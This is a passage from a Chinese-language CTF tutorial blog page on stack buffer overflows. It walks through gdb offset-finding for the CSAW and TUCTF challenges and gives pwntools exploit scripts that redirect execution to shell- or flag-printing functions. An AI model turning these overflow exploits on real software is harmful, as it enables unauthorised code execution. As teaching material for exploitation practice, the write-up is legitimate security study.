(&lt;__memcpy_ssse3+7232&gt;:	mov    rcx,QWORD PTR [rsi-0x9])</span><br><span class="line">R10: 0x602010 --&gt; 0x0 </span><br><span class="line">R11: 0x7ffff7ba0ec0 --&gt; 0xfffb14e0fffb1318 </span><br><span class="line">R12: 0x400520 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffddc0 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x400696 &lt;main+121&gt;:	mov    rdi,rax</span><br><span class="line">   0x400699 &lt;main+124&gt;:	mov    eax,0x0</span><br><span class="line">   0x40069e &lt;main+129&gt;:	call   0x400500 &lt;gets@plt&gt;</span><br><span class="line">&#x3D;&gt; 0x4006a3 &lt;main+134&gt;:	leave  </span><br><span class="line">   0x4006a4 &lt;main+135&gt;:	ret    </span><br><span class="line">   0x4006a5:	nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x4006af:	nop</span><br><span class="line">   0x4006b0 &lt;__libc_csu_init&gt;:	push   r15</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdc60 (&quot;0x40060d\n&quot;)</span><br><span class="line">0008| 0x7fffffffdc68 --&gt; 0xa (&#39;\n&#39;)</span><br><span class="line">0016| 0x7fffffffdc70 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdc78 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffffdc80 --&gt; 0x9 (&#39;\t&#39;)</span><br><span class="line">0040| 0x7fffffffdc88 --&gt; 0x7ffff7dd7660 (&lt;dl_main&gt;:	push   rbp)</span><br><span class="line">0048| 0x7fffffffdc90 --&gt; 0x7fffffffdcf8 --&gt; 0x7fffffffddc8 --&gt; 0x7fffffffe167 (&quot;&#x2F;home&#x2F;vuln&#x2F;nightmare&#x2F;modules&#x2F;05-bof_callfunction&#x2F;csaw16_warmup&#x2F;warmup&quot;)</span><br><span class="line">0056| 0x7fffffffdc98 --&gt; 0x1 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br></pre></td></tr></table></figure>
+<p>这里随意输入了几个aaaa，然后在内存中搜索aaaa，即可得到变量v5的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ searchmem aaaaa</span><br><span class="line">Searching for &#39;aaaaa&#39; in: None ranges</span><br><span class="line">Found 4 results, display max 4 items:</span><br><span class="line"> [heap] : 0x602260 (&quot;aaaaaaaaaa\n&quot;)</span><br><span class="line"> [heap] : 0x602265 --&gt; 0xa6161616161 (&#39;aaaaa\n&#39;)</span><br><span class="line">[stack] : 0x7fffffffdca0 (&quot;aaaaaaaaaa&quot;)</span><br><span class="line">[stack] : 0x7fffffffdca5 --&gt; 0x6161616161 (&#39;aaaaa&#39;)</span><br></pre></td></tr></table></figure>
+<p>在栈中，可以得到v5的地址为 0x7fffffffdca0，接着我们继续看栈上其他寄存器的信息，使用info frame命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ i f</span><br><span class="line">Stack level 0, frame at 0x7fffffffdcf0:</span><br><span class="line"> rip &#x3D; 0x4006a3 in main; saved rip &#x3D; 0x7ffff7a05b97</span><br><span class="line"> called by frame at 0x7fffffffddb0</span><br><span class="line"> Arglist at 0x7fffffffdce0, args: </span><br><span class="line"> Locals at 0x7fffffffdce0, Previous frame&#39;s sp is 0x7fffffffdcf0</span><br><span class="line"> Saved registers:</span><br><span class="line">  rbp at 0x7fffffffdce0, rip at 0x7fffffffdce8</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到rip的地址为 0x7fffffffdce8 ，所以v5到rip之间相差了 0x7fffffffdce8 - 0x7fffffffdca0 = 72字节<br>从上面程序的运行结果可以得到，easy函数的地址为 0x40060d</p>
+<p><img src="/img/pwn/stack1/76572974.png"></p>
+<p>所以构造的payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;A&#39; * 72 + p64(0x40060d)</span><br><span class="line">target &#x3D; process(&#39;.&#x2F;warmup&#39;)</span><br><span class="line">target.sendline(payload)</span><br><span class="line">target.interactive()</span><br><span class="line"># ubuntu 19.04 x64 环境中测试失败，无法成功运行</span><br></pre></td></tr></table></figure>
+<p>经过测试，null byte被忽略了，导致P64(0x40060d)的高4位null字符被忽略了</p>
+<p><img src="/img/pwn/stack1/13875cc0-f103-4431-8503-4f516526e62d.png"></p>
+<p>这里无法覆盖为0x00，所以无法修改rip为easy函数的地址。</p>
+<h2 id="5-Csaw-Quals-2018-Get-It"><a href="#5-Csaw-Quals-2018-Get-It" class="headerlink" title="5. Csaw Quals 2018 Get It"></a>5. Csaw Quals 2018 Get It</h2><p>查看程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>64位程序没有开启canary &amp; PIE<br>运行程序</p>
+<p><img src="/img/pwn/stack1/76784372.png"></p>
+<p>使用IDA查看</p>
+<p><img src="/img/pwn/stack1/76908397.png"></p>
+<p>还有一个give_shell函数<br><img src="/img/pwn/stack1/78318956.png"></p>
+<p>程序很简单，就是获取一个输入，那么就只能覆盖RIP，进行RCE了，要覆盖RIP，就必须在RIP中填入shellcode的地址，这里我们只需要在RIP中填入give_shell函数的地址即可(在栈canary没有开启的情况下)</p>
+<p><img src="/img/pwn/stack1/77571572.png"></p>
+<p>在X64架构中，rbp的地址为rbp+0x00, rip跟rbp相差0x8个字节，rip的地址为rbp+0x8<br>从汇编代码中可以看到，v4变量对应的是var_20，地址为rbp-0x20，其中还有两个多余的变量var_24, var_30，这里我们不需要管，这两个变量不影响var_20，因为在他们不在var_20和rbp之间，栈的结构如下(底部是栈顶)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">RETURN ADDRESS</span><br><span class="line">RBP</span><br><span class="line">ALIGNMENT SPACE</span><br><span class="line">ALIGNMENT SPACE</span><br><span class="line">VAR_20</span><br><span class="line">VAR_24</span><br><span class="line">VAR_30</span><br><span class="line">ESP</span><br></pre></td></tr></table></figure>
+<p>所以在这个程序中，var_20跟rip之间相差了0x20 + 0x8 = 40个字节<br>使用gdb调试查看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x0 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7ffff7dcfa00 --&gt; 0xfbad2288 </span><br><span class="line">RDX: 0x7ffff7dd18d0 --&gt; 0x0 </span><br><span class="line">RSI: 0x602675 --&gt; 0xa (&#39;\n&#39;)</span><br><span class="line">RDI: 0x7fffffffdcc5 --&gt; 0x4004c0000000 </span><br><span class="line">RBP: 0x7fffffffdce0 --&gt; 0x400600 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">RSP: 0x7fffffffdcb0 --&gt; 0x7fffffffddc8 --&gt; 0x7fffffffe16c (&quot;&#x2F;home&#x2F;vuln&#x2F;nightmare&#x2F;modules&#x2F;05-bof_callfunction&#x2F;csaw18_getit&#x2F;get_it&quot;)</span><br><span class="line">RIP: 0x4005f6 (&lt;main+47&gt;:	leave)</span><br><span class="line">R8 : 0x602676 --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7b52940 (&lt;__memcpy_ssse3+8688&gt;:	mov    edx,DWORD PTR [rsi-0x4])</span><br><span class="line">R10: 0x602010 --&gt; 0x0 </span><br><span class="line">R11: 0x7ffff7ba0ec0 --&gt; 0xfffb14e0fffb1318 </span><br><span class="line">R12: 0x4004c0 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffddc0 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x4005e7 &lt;main+32&gt;:	mov    eax,0x0</span><br><span class="line">   0x4005ec &lt;main+37&gt;:	call   0x4004a0 &lt;gets@plt&gt;</span><br><span class="line">   0x4005f1 &lt;main+42&gt;:	mov    eax,0x0</span><br><span class="line">&#x3D;&gt; 0x4005f6 &lt;main+47&gt;:	leave  </span><br><span class="line">   0x4005f7 &lt;main+48&gt;:	ret    </span><br><span class="line">   0x4005f8:	nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x400600 &lt;__libc_csu_init&gt;:	push   r15</span><br><span class="line">   0x400602 &lt;__libc_csu_init+2&gt;:	push   r14</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdcb0 --&gt; 0x7fffffffddc8 --&gt; 0x7fffffffe16c (&quot;&#x2F;home&#x2F;vuln&#x2F;nightmare&#x2F;modules&#x2F;05-bof_callfunction&#x2F;csaw18_getit&#x2F;get_it&quot;)</span><br><span class="line">0008| 0x7fffffffdcb8 --&gt; 0x100000000 </span><br><span class="line">0016| 0x7fffffffdcc0 --&gt; 0x6161616161 (&#39;aaaaa&#39;)</span><br><span class="line">0024| 0x7fffffffdcc8 --&gt; 0x4004c0 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">0032| 0x7fffffffdcd0 --&gt; 0x7fffffffddc0 --&gt; 0x1 </span><br><span class="line">0040| 0x7fffffffdcd8 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdce0 --&gt; 0x400600 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">0056| 0x7fffffffdce8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:	mov    edi,eax)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00000000004005f6 in main ()</span><br><span class="line">gdb-peda$ i f</span><br><span class="line">Stack level 0, frame at 0x7fffffffdcf0:</span><br><span class="line"> rip &#x3D; 0x4005f6 in main; saved rip &#x3D; 0x7ffff7a05b97</span><br><span class="line"> called by frame at 0x7fffffffddb0</span><br><span class="line"> Arglist at 0x7fffffffdce0, args: </span><br><span class="line"> Locals at 0x7fffffffdce0, Previous frame&#39;s sp is 0x7fffffffdcf0</span><br><span class="line"> Saved registers:</span><br><span class="line">  rbp at 0x7fffffffdce0, rip at 0x7fffffffdce8</span><br><span class="line">gdb-peda$ x&#x2F;g $rbp+0x8</span><br><span class="line">0x7fffffffdce8:	0x00007ffff7a05b97</span><br><span class="line">gdb-peda$ searchmem aaaa</span><br><span class="line">Searching for &#39;aaaa&#39; in: None ranges</span><br><span class="line">Found 2 results, display max 2 items:</span><br><span class="line"> [heap] : 0x602670 --&gt; 0xa6161616161 (&#39;aaaaa\n&#39;)</span><br><span class="line">[stack] : 0x7fffffffdcc0 --&gt; 0x6161616161 (&#39;aaaaa&#39;)</span><br></pre></td></tr></table></figure>
+<p>所以 0x7fffffffdce8 - 0x7fffffffdcc0 = 40，从IDA中可以得到give_shell函数的地址为 0x4005B6，exploit如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">payload &#x3D; &#39;A&#39; * 40 + p64(0x4005B6)</span><br><span class="line">target &#x3D; process(&#39;.&#x2F;get_it&#39;)</span><br><span class="line">target.sendline(payload)</span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="6-tuctf-2017-vulnchat"><a href="#6-tuctf-2017-vulnchat" class="headerlink" title="6. tuctf 2017 vulnchat"></a>6. tuctf 2017 vulnchat</h2><p>首先查看程序</p>
+<p><img src="/img/pwn/stack1/85346488.png"></p>
+<p>运行程序<br><img src="/img/pwn/stack1/85378790.png"></p>
+<p>程序有两个输入点，使用IDA查看代码<br>main函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4[20]; &#x2F;&#x2F; [esp+3h] [ebp-2Dh] BYREF</span><br><span class="line">  char v5[20]; &#x2F;&#x2F; [esp+17h] [ebp-19h] BYREF</span><br><span class="line">  char var5[9]; &#x2F;&#x2F; [esp+2Bh] [ebp-5h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0x14u);</span><br><span class="line">  puts(&quot;----------- Welcome to vuln-chat -------------&quot;);</span><br><span class="line">  printf(&quot;Enter your username: &quot;);</span><br><span class="line">  strcpy(var5, &quot;%30s&quot;);</span><br><span class="line">  __isoc99_scanf(var5, v5);</span><br><span class="line">  printf(&quot;Welcome %s!\n&quot;, v5);</span><br><span class="line">  puts(&quot;Connecting to &#39;djinn&#39;&quot;);</span><br><span class="line">  sleep(1u);</span><br><span class="line">  puts(&quot;--- &#39;djinn&#39; has joined your chat ---&quot;);</span><br><span class="line">  puts(&quot;djinn: I have the information. But how do I know I can trust you?&quot;);</span><br><span class="line">  printf(&quot;%s: &quot;, v5);</span><br><span class="line">  __isoc99_scanf(var5, v4);</span><br><span class="line">  puts(&quot;djinn: Sorry. That&#39;s not good enough&quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>printFlag函数</p>
+<p><img src="/img/pwn/stack1/e023e0ab-843e-4f5a-b32b-f6370598181d.png"></p>
+<p>从main函数可以看出，var5的值为%30s，所以在接下来的两次scanf中，都只接收30个字符串。现在我们看看输入点v5和输入点v4与eip直接的差值为多少。在IDA中，我们可以看到v4对应var_2D, v5对应var_19，从调用约定上来看，我们可以算出v4到eip的距离为0x2d+4 = 49, v5到eip为0x19+4 = 29，而我们的输入点限制了长度为30，无法完整的覆盖eip。</p>
+<p><img src="/img/pwn/stack1/85950964.png"></p>
+<p>不过这里我们可以看到var5的到v5直接的距离为0x19 - 0x5 = 20，那么我们可以把var5的值覆盖掉，改成%99s，这样后面v4的输入限制就会从30变成了99，就能够覆盖eip，执行我们要执行的函数printFlag了。</p>
+<p>所以第一段的payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;a&#39; * 0x14 + &#39;%99s&#39;</span><br></pre></td></tr></table></figure>
+<p>接着我们要找到v4变量到EIP之间的字节数，使用gdb进行分析<br>断点设置如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *(main +178)</span><br></pre></td></tr></table></figure>
+<p>运行程序，第一次输入 abcd，第二次输入10个0</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  r</span><br><span class="line">Starting program: &#x2F;home&#x2F;vuln&#x2F;nightmare&#x2F;modules&#x2F;05-bof_callfunction&#x2F;tu17_vulnchat&#x2F;vuln-chat </span><br><span class="line">----------- Welcome to vuln-chat -------------</span><br><span class="line">Enter your username: abcd</span><br><span class="line">Welcome abcd!</span><br><span class="line">Connecting to &#39;djinn&#39;</span><br><span class="line">--- &#39;djinn&#39; has joined your chat ---</span><br><span class="line">djinn: I have the information. But how do I know I can trust you?</span><br><span class="line">abcd: 0000000000</span><br></pre></td></tr></table></figure>
+<p>接着我们在内存中查找输入的10个0，然后查看此时的栈帧情况</p>
+<p><img src="/img/pwn/stack1/90a53d4f-f8d2-4b60-a386-02c9f6954a8f.png"></p>
+<p>从上面的信息可以看出，两者相差了49个字节，所以第二段的payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># printFlag address 0x804856B</span><br><span class="line">&#39;A&#39; * 49 + p32(804856B)</span><br></pre></td></tr></table></figure>
+<p>最终exploit</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p1 &#x3D; &#39;&#39;</span><br><span class="line">p1 +&#x3D; &#39;A&#39; * 0x14</span><br><span class="line">p1 +&#x3D; &#39;%99s&#39;</span><br><span class="line"></span><br><span class="line">target &#x3D; process(&#39;.&#x2F;vuln-chat&#39;)</span><br><span class="line"></span><br><span class="line">target.recvuntil(&#39;username:&#39;)</span><br><span class="line">target.sendline(p1)</span><br><span class="line"></span><br><span class="line">target.recvuntil(p1+&#39;:&#39;)</span><br><span class="line">p2 &#x3D; &#39;&#39;</span><br><span class="line">p2 +&#x3D; &#39;A&#39; * 49</span><br><span class="line">p2 +&#x3D; p32(0x804856B)</span><br><span class="line">target.sendline(p2)</span><br><span class="line"></span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/img/pwn/stack1/05582d89-77a2-4b59-ab9f-2507f5dfdf13.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/POC/">POC</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-BOI"><span class="toc-number">1.</span> <span class="toc-text">1. BOI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Tamu19-pwn1"><span class="toc-number">2.</span> <span class="toc-text">2. Tamu19 pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-TokyoWesterns%E2%80%9917-JustDoIt"><span class="toc-number">3.</span> <span class="toc-text">3. TokyoWesterns’17: JustDoIt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Csaw-2016-Quals-Warmup"><span class="toc-number">4.</span> <span class="toc-text">4. Csaw 2016 Quals Warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Csaw-Quals-2018-Get-It"><span class="toc-number">5.</span> <span class="toc-text">5. Csaw Quals 2018 Get It</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-tuctf-2017-vulnchat"><span class="toc-number">6.</span> <span class="toc-text">6. tuctf 2017 vulnchat</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&text=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&title=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&is_video=false&description=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PWN 入门基础 - 栈溢出 - 1&body=Check out this article: http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&title=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&title=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&title=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&title=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&name=PWN 入门基础 - 栈溢出 - 1&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/04/22/pwn-primer-stack-buffer-overflower-1/&t=PWN 入门基础 - 栈溢出 - 1"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    lex
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/POC/">POC</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
